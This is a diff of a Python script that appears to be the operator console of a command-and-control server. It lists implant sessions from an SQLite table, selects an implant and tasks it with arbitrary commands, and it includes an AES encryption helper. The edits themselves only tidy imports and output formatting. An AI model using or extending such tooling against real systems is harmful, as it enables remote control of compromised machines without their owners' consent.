@@ -7,17 +7,13 @@ import logging
 import time
 import os
 import ssl
-import requests
 import base64 
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad,unpad
-from os import curdir
-from os.path import join as pjoin
 import cgi
 import sqlite3 as db
-import random
 from datetime import datetime
-import re
+
 
 
 #global variables 
@@ -191,7 +187,7 @@ def process():
         #    print(row)
 
         last_row = cursor.execute('select * from IMPLANT_TABLE').fetchall()[-1]
-        print(green + "\n\n[*] " + reset +"New implant check in: ", last_row)
+        print(green + "\n[*] " + reset +"New implant check in: ", last_row)
 
         conn.close()
 
@@ -280,7 +276,6 @@ while True:
         print()
 
     if "sessions" in command:
-        #print("Hi sessions ") 
 
         # Display all data
         
@@ -291,24 +286,22 @@ while True:
         for row in data:
             print(row)
         conn.close()
+        print()
 
     else: 
         print()
 
     if "use" in command:
-        
-        print() 
         ActiveImplant = command.rsplit(' ')[1]
-        print(green + "[*] " + reset + "Active Implant is now: " + "[" + cyan + ActiveImplant + reset + "]")
+        print(green + "[*] " + reset + "Active Implant is now: " + "[" + cyan + ActiveImplant + reset + "]\n")
 
-        
         while True:
             command = input(str(now)[:19] + " [" + cyan + ActiveImplant + reset + "] " + " >> ") # date + UTC time
 
             if "task" in command:
-                print() 
+                #print() 
                 TaskToRun = command.rsplit('task ')[-1]
-                print(green + "[*] " + reset + "Tasked "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun)
+                print(green + "\n[*] " + reset + "Tasked "+ cyan + ActiveImplant + reset + " to run: " + TaskToRun + "\n")
                 
                 data = TaskToRun
                 
@@ -325,20 +318,15 @@ while True:
                 command = input(str(now)[:19] + " [" + cyan + ActiveImplant + reset + "] " + " >> ") # date + UTC time
 
             else: 
-                print() 
+                pass
 
             if "back" in command:
                 break
 
     else: 
-        print()
+        pass
 
     def encrypt(data,key,iv):
         data= pad(data.encode(),16)
         cipher = AES.new(key.encode('utf-8'),AES.MODE_CBC,iv)
         return base64.b64encode(cipher.encrypt(data))
-
-    
-
-
-
